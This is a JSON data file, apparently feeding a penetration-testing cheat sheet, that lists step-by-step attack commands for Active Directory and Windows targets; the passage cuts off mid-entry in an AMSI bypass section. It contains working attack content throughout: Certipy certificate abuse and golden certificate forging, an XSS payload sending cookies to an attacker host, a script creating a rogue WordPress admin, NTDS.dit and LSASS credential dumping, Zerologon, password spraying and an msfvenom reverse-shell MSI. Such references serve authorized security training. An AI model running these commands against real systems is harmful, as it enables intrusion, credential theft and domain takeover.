                "code": "certipy req -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -retrieve <RequestID>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "You have ManageCA or ManageCertificates rights on the CA itself."
          }
        ]
      },
      {
        "title": "ESC8 - NTLM Relay to AD CS",
        "substeps": [
          {
            "title": "Start Relay",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy relay -ca <CA_IP> -template DomainController"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Coerce Authentication",
            "codes": [
              {
                "lang": "bash",
                "code": "petitpotam.py <AttackerIP> <DC_IP>"
              },
              {
                "lang": "bash",
                "code": "printerbug.py <Domain>/<User>:<Password>@<DC_IP> <AttackerIP>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Run from separate terminal."
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "HTTP enrollment endpoint with NTLM auth enabled. Relay machine account."
          }
        ]
      },
      {
        "title": "Authenticate with Certificate",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy auth -pfx <Cert>.pfx -dc-ip <DC_IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use PKINIT to get NT hash from certificate."
          }
        ]
      },
      {
        "title": "LDAP Shell from Certificate",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy auth -pfx <Cert>.pfx -dc-ip <DC_IP> -ldap-shell"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use if PKINIT not supported."
          }
        ]
      },
      {
        "title": "Shadow Credentials Attack",
        "codes": [
          {
            "lang": "bash",
            "code": "certipy shadow auto -u '<User>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -account '<TargetUser>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Write to msDS-KeyCredentialLink. Authenticate as target."
          }
        ]
      },
      {
        "title": "Golden Certificate Attack",
        "substeps": [
          {
            "title": "Backup CA Cert and Key",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy ca -u '<Admin>@<Domain>' -p '<Password>' -dc-ip <DC_IP> -ca '<CA_Name>' -backup"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Requires CA admin privileges."
              }
            ]
          },
          {
            "title": "Forge Certificate",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy forge -ca-pfx <CA>.pfx -upn Administrator@<Domain> -subject \"CN=Administrator,CN=Users,DC=<Domain>,DC=<TLD>\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Authenticate with Forged Cert",
            "codes": [
              {
                "lang": "bash",
                "code": "certipy auth -pfx administrator_forged.pfx -dc-ip <DC_IP>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "CA private key compromised. Forge certs for anyone forever."
          }
        ]
      },
      {
        "title": "Certipy Useful Flags",
        "codes": [],
        "optional": true,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "**-hashes :<NTHash>** Pass-the-hash instead of password\n**-pfx <File>** Use certificate for auth\n**-ns <IP>** Custom nameserver\n**-dns-tcp** Use TCP for DNS\n**-timeout 10** Connection timeout"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Certipy GitHub",
        "url": "https://github.com/ly4k/Certipy"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Active Directory Certificate Services exploitation with Certipy.\n**ESC1** Template allows SAN, low-priv users can enroll\n**ESC2** Template allows Any Purpose EKU\n**ESC3** Certificate Request Agent abuse\n**ESC4** Vulnerable template ACLs\n**ESC5** Vulnerable PKI object ACLs\n**ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n**ESC7** Vulnerable CA ACLs\n**ESC8** NTLM relay to HTTP enrollment endpoint"
      }
    ]
  },
  {
    "category": "Cross-Site Scripting (XSS)",
    "title": "Advanced Exploitation",
    "tags": [
      "Exploitation",
      "HTTP",
      "Initial_Access",
      "Python",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Cookie Stealing",
        "substeps": [
          {
            "title": "Steal Cookie via Image Request",
            "codes": [
              {
                "lang": "html",
                "code": "<script>new Image().src=\"http://<AttackerIP>/steal?c=\"+document.cookie;</script>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check for **HttpOnly** flag - prevents JavaScript access. If not set, cookies can be stolen via XSS.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Encoded Payloads",
        "substeps": [
          {
            "title": "JavaScript Encoding Function",
            "codes": [
              {
                "lang": "javascript",
                "code": "function encode_to_javascript(string) {\n    var output = '';\n    for(pos = 0; pos < string.length; pos++) {\n        output += string.charCodeAt(pos);\n        if(pos != (string.length - 1)) {\n            output += \",\";\n        }\n    }\n    return output;\n}"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Execute Encoded Payload",
            "codes": [
              {
                "lang": "html",
                "code": "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Encode payload to avoid bad character issues."
          }
        ]
      },
      {
        "title": "WordPress Privilege Escalation",
        "substeps": [
          {
            "title": "Create Admin Script",
            "codes": [
              {
                "lang": "javascript",
                "code": "var ajaxRequest = new XMLHttpRequest();\nvar requestURL = \"/wp-admin/user-new.php\";\nvar nonceRegex = /ser\" value=\"([^\"]*?)\"/g;\najaxRequest.open(\"GET\", requestURL, false);\najaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText);\nvar nonce = nonceMatch[1];\nvar params = \"action=createuser&_wpnonce_create-user=\"+nonce+\"&user_login=attacker&email=attacker@evil.com&pass1=attackerpass&pass2=attackerpass&role=administrator\";\najaxRequest = new XMLHttpRequest();\najaxRequest.open(\"POST\", requestURL, true);\najaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\najaxRequest.send(params);"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Use **jscompress.com** to minify payload to one line before encoding.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Inject via User-Agent",
            "codes": [
              {
                "lang": "bash",
                "code": "curl -i http://<Target> --user-agent \"<script>eval(String.fromCharCode(<EncodedPayload>))</script>\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "JavaScript to steal nonce and create new admin user.",
            "variant": "danger"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Evil-WinRM",
    "title": "Advanced Features",
    "tags": [],
    "steps": [
      {
        "title": "Loading PowerShell Scripts from Kali",
        "substeps": [
          {
            "title": "Using Loaded Scripts",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Once connected with -s flag\nBypass-4MSI\nInvoke-Mimikatz.ps1\nInvoke-Mimikatz"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/scripts"
          }
        ]
      },
      {
        "title": "Loading Executables/Binaries",
        "substeps": [
          {
            "title": "Executing Loaded Binaries",
            "codes": [
              {
                "lang": "powershell",
                "code": "# View available commands\nmenu\n\n# Execute binary\nInvoke-Binary /opt/executables/winPEASx64.exe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -e /opt/executables"
          }
        ]
      },
      {
        "title": "Combined Scripts and Executables",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/scripts -e /opt/executables"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enable Logging",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -l"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Logs all commands and output to a file for later review.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "KeePass Password Manager",
    "title": "Advanced Techniques",
    "tags": [],
    "steps": [
      {
        "title": "Brute Force with Custom Wordlist",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create custom wordlist based on company name\ncat > custom.txt << EOF\nCompanyName123\nCompanyName2024\nCompanyName!\nWelcome123\nPassword123\nEOF\n\n# Crack with custom list\njohn keepass.hash --wordlist=custom.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Mask Attack with Hashcat",
        "codes": [
          {
            "lang": "bash",
            "code": "# Pattern: 8 lowercase letters\nhashcat -m 13400 keepass.hash -a 3 ?l?l?l?l?l?l?l?l\n\n# Pattern: Capital + 6 lowercase + 2 digits\nhashcat -m 13400 keepass.hash -a 3 ?u?l?l?l?l?l?l?d?d\n\n# Pattern: Word + year\nhashcat -m 13400 keepass.hash -a 6 wordlist.txt ?d?d?d?d"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Incremental Mode",
        "codes": [
          {
            "lang": "bash",
            "code": "john keepass.hash --incremental"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Password Cracking",
    "title": "Advanced Techniques",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Loopback Mode",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -a 0 -m 0 <HashFile> <Wordlist> --loopback"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use already cracked passwords as input for further cracking.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Incremental Mode (John)",
        "codes": [
          {
            "lang": "bash",
            "code": "john --incremental <HashFile>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using Previously Found Passwords (John)",
        "codes": [
          {
            "lang": "bash",
            "code": "john --loopback <HashFile>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "File Transfer Techniques",
    "title": "Advanced Techniques",
    "tags": [],
    "steps": [
      {
        "title": "Using Evil-WinRM",
        "codes": [
          {
            "lang": "bash",
            "code": "# Connect with Evil-WinRM\nevil-winrm -i <TargetIP> -u <User> -p <Pass>"
          },
          {
            "lang": "powershell",
            "code": "# Upload file\nupload /opt/tools/nc.exe C:\\Windows\\Temp\\nc.exe\n\n# Download file\ndownload C:\\Users\\Admin\\Desktop\\flag.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using RDP Shared Folder",
        "codes": [
          {
            "lang": "bash",
            "code": "# Mount local folder in RDP session\nxfreerdp3 /u:<User> /p:<Pass> /v:<TargetIP> /drive:share,/opt/tools"
          },
          {
            "lang": "bash",
            "code": "# On Windows - Access shared folder\ndir \\\\tsclient\\share\ncopy \\\\tsclient\\share\\nc.exe C:\\Windows\\Temp\\"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using Meterpreter",
        "codes": [
          {
            "lang": "bash",
            "code": "# In Meterpreter session\nupload /opt/tools/nc.exe C:\\\\Windows\\\\Temp\\\\nc.exe\ndownload C:\\\\Users\\\\Admin\\\\Desktop\\\\passwords.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "SSH Pivoting",
    "title": "Advanced Techniques",
    "tags": [],
    "steps": [
      {
        "title": "Jump Host Chaining",
        "codes": [
          {
            "lang": "bash",
            "code": "# First hop\nssh user1@10.10.10.5 -D 9050 -f -N\n\n# Second hop through first\nproxychains4 ssh user2@192.168.1.100 -D 9051 -f -N"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Now configure proxychains to use port 9051 for the second network segment.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "SSH Config for Easy Pivoting",
        "codes": [
          {
            "lang": "bash",
            "code": "nano ~/.ssh/config"
          },
          {
            "lang": "plaintext",
            "code": "Host pivot\n    HostName 10.10.10.5\n    User adminuser\n    IdentityFile ~/.ssh/id_rsa\n    DynamicForward 9050\n    \nHost internal\n    HostName 192.168.1.100\n    User administrator\n    ProxyJump pivot"
          },
          {
            "lang": "bash",
            "code": "# Connect directly to internal host\nssh internal"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "NetExec",
    "title": "Advanced Techniques",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Password Spraying",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb targets.txt -u users.txt -p 'Password123!' --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Monitor lockout threshold with `--pass-pol` first.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Spray with Delay",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb targets.txt -u users.txt -p 'Password123!' --continue-on-success --delay 5"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Adds 5-second delay between attempts to avoid lockouts.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Find Local Admin Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u <Username> -p '<Password>' | grep Pwn3d"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Look for `(Pwn3d!)` to identify machines where you have admin rights.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Relay Attack Setup",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> --gen-relay-list relay_targets.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Generates list of targets without SMB signing for relay attacks."
          }
        ]
      },
      {
        "title": "Check SMB Signing",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Targets without SMB signing are vulnerable to relay attacks.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Advanced Tunneling",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "Forward Tunneling (Less Common)",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server -p 8000"
          },
          {
            "lang": "bash",
            "code": "# Forward Kali's port 8080 to victim's localhost:80\nchisel client 10.10.14.5:8000 8080:127.0.0.1:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**On Kali (server):**"
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "Now accessing victim's port 8080 reaches its localhost:80.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Multiple Hops",
        "codes": [
          {
            "lang": "bash",
            "code": "chisel server -p 8000 --reverse"
          },
          {
            "lang": "bash",
            "code": "# Forward Victim2's services through Victim1\nchisel client 10.10.14.5:8000 R:9000:192.168.200.50:80"
          },
          {
            "lang": "bash",
            "code": "# Further pivoting\nchisel client 192.168.200.1:9000 R:9001:192.168.300.50:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**Scenario:** Kali \u2192 Victim1 \u2192 Victim2"
          },
          {
            "type": "text",
            "content": "**On Kali:**"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Advanced Usage",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Execute with Specific Logon Type",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username <User> -Password '<Password>' -LogonType Interactive -Command \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "text",
            "content": "**Logon Types:**\n- `Interactive` (2) - Interactive logon\n- `Network` (3) - Network logon\n- `Batch` (4) - Batch logon\n- `Service` (5) - Service logon\n- `NetworkCleartext` (8) - Network logon with cleartext credentials\n- `NewCredentials` (9) - New credentials (like runas /netonly)"
          }
        ]
      },
      {
        "title": "Execute with Bypass",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username <User> -Password '<Password>' -Command \"powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\script.ps1\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute with Output Redirection",
        "codes": [
          {
            "lang": "powershell",
            "code": "Invoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"cmd.exe /c dir C:\\Users\\Administrator\\Desktop > C:\\Temp\\output.txt\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "MS SQL Privilege Escalation",
    "title": "Agent Jobs [alternative]",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "SQL",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```sql\n-- Create job that executes command\nUSE msdb\nEXEC sp_add_job @job_name = 'ExecuteCmd'\nEXEC sp_add_jobstep @job_name = 'ExecuteCmd', @step_name = 'RunCmd', @subsystem = 'CmdExec', @command = 'whoami > C:\\output.txt'\nEXEC sp_add_jobserver @job_name = 'ExecuteCmd'\nEXEC sp_start_job @job_name = 'ExecuteCmd'\n```"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Alternative Password Hash Methods",
    "tags": [],
    "steps": [
      {
        "title": "Using Python",
        "codes": [
          {
            "lang": "python",
            "code": "python3 -c 'import crypt; print(crypt.crypt(\"Password123\", crypt.mksalt(crypt.METHOD_SHA512)))'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using Perl",
        "codes": [
          {
            "lang": "perl",
            "code": "perl -e 'print crypt(\"Password123\", \"salt\"),\"\\n\"'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Using mkpasswd",
        "codes": [
          {
            "lang": "bash",
            "code": "mkpasswd -m sha-512 Password123"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Constrained Delegation",
    "title": "Alternative Service Attack",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "Common SPN Alternatives",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **cifs** - File share access\n- **http** - WinRM access\n- **host** - General host access\n- **ldap** - LDAP queries\n- **mssql** - SQL Server access"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Request ticket for different service on same host. SPN's service class is not validated.",
        "variant": "tip"
      },
      {
        "type": "text",
        "content": "```cmd\nRubeus.exe s4u /user:<ServiceAccount> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:http/<Target> /altservice:cifs /ptt\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Alternative Shells",
    "tags": [],
    "steps": [
      {
        "title": "Bash Interactive",
        "codes": [
          {
            "lang": "bash",
            "code": "bash -i"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Zsh Interactive",
        "codes": [
          {
            "lang": "bash",
            "code": "zsh -i"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Sh Interactive",
        "codes": [
          {
            "lang": "bash",
            "code": "sh -i"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Password Spraying",
    "title": "Alternative Tools",
    "tags": [
      "Credential_Access",
      "Initial_Access",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "nxc_enum Multi-Credential Mode",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <TargetIP> -C creds.txt -d <Domain> --validate-only --continue-on-success"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Tests multiple credentials from file. Format: `user:password` per line.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "ffuf Login Brute Force",
        "codes": [
          {
            "lang": "bash",
            "code": "ffuf -w /usr/share/wordlists/rockyou.txt -u http://<TargetIP>/login -X POST -d \"username=admin&password=FUZZ\" -H \"Content-Type: application/x-www-form-urlencoded\" -fc 401 -c"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Wfuzz Login Brute Force",
        "codes": [
          {
            "lang": "bash",
            "code": "wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d \"username=admin&password=FUZZ\" --hs \"Invalid\" http://<TargetIP>/login"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Alternative Tools",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "diskshadow.exe (Built-in Windows Tool)",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Create script file\necho \"set context persistent nowriters\" > diskshadow.txt\necho \"add volume C: alias mydisk\" >> diskshadow.txt\necho \"create\" >> diskshadow.txt\necho \"expose %mydisk% Z:\" >> diskshadow.txt\n\n# Execute script\ndiskshadow /s diskshadow.txt\n\n# Copy files from Z: drive\ncopy Z:\\Windows\\NTDS\\ntds.dit C:\\Temp\\ntds.dit\ncopy Z:\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM\n\n# Cleanup\necho \"unexpose Z:\" > cleanup.txt\ndiskshadow /s cleanup.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "esentutl.exe (Repair NTDS.dit)",
        "codes": [
          {
            "lang": "powershell",
            "code": "# If NTDS.dit is corrupted\nesentutl /p /o ntds.dit"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Only use if secretsdump fails due to corruption.",
            "variant": "warning"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Zerologon",
    "title": "Alternative Tools",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Mimikatz Zerologon Module",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # lsadump::zerologon /target:<DC-IP> /account:<DC-NetBIOS-Name>$"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SharpZeroLogon (C# Implementation)",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\SharpZeroLogon.exe <DC-NetBIOS-Name> <DC-IP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Metasploit Module",
        "codes": [
          {
            "lang": "bash",
            "code": "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon\nset RHOSTS <DC-IP>\nset NBNAME <DC-NetBIOS-Name>\nrun"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "KeePass Password Manager",
    "title": "Alternative: KeePass Memory Dump",
    "tags": [],
    "steps": [
      {
        "title": "If KeePass is Running",
        "codes": [
          {
            "lang": "bash",
            "code": "# Find KeePass process\nps aux | grep -i keepass\n\n# Dump process memory (requires root)\nsudo gcore <PID>\n\n# Search for master password in dump\nstrings core.<PID> | grep -i password"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If KeePass is running on the target, you can dump the master password from memory.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Windows Memory Dump",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Using Mimikatz\nmimikatz.exe\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonPasswords"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "AlwaysInstallElevated Exploitation",
    "title": "AlwaysInstallElevated Exploitation",
    "tags": [
      "Exploitation",
      "Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Verify Vulnerability",
        "codes": [
          {
            "lang": "powershell",
            "code": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Malicious MSI",
        "codes": [
          {
            "lang": "bash",
            "code": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KaliIP> LPORT=<PORT> -f msi -o shell.msi"
          },
          {
            "lang": "bash",
            "code": "# Alternative: add user to administrators\nmsfvenom -p windows/adduser USER=<Username> PASS=<Password> -f msi -o adduser.msi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Install MSI",
        "codes": [
          {
            "lang": "bash",
            "code": "msiexec /quiet /qn /i C:\\path\\shell.msi"
          },
          {
            "lang": "bash",
            "code": "msiexec /quiet /qn /i \\\\<KaliIP>\\share\\shell.msi"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks AlwaysInstallElevated",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "When both HKCU and HKLM AlwaysInstallElevated keys are set to `0x1`, any user can install MSI packages with SYSTEM privileges.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "AMSI Bypass",
    "title": "AMSI Bypass",
    "tags": [
      "AMSI_Bypass",
      "Code_Injection",
      "Defense_Evasion",
      "PowerShell",
      "Windows"
    ],
    "steps": [
      {
        "title": "Understanding AMSI",
        "substeps": [
          {
            "title": "AMSI Architecture",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "- **amsi.dll** - Core AMSI library loaded into process\n- **AmsiScanBuffer** - Function that scans content\n- **AmsiScanString** - Scans string content\n- **AmsiInitialize** - Initializes AMSI context"
              }
            ]
          },
          {
            "title": "AMSI Flow",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "AMSI execution flow:\n1. PowerShell loads amsi.dll\n2. AmsiInitialize creates context\n3. Before executing script, AmsiScanBuffer is called\n4. AV provider (Defender) scans content\n5. Returns AMSI_RESULT (clean, detected, etc.)",
                "variant": "info"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Bypassing AMSI with Reflection",
        "substeps": [
          {
            "title": "Context Corruption Method",
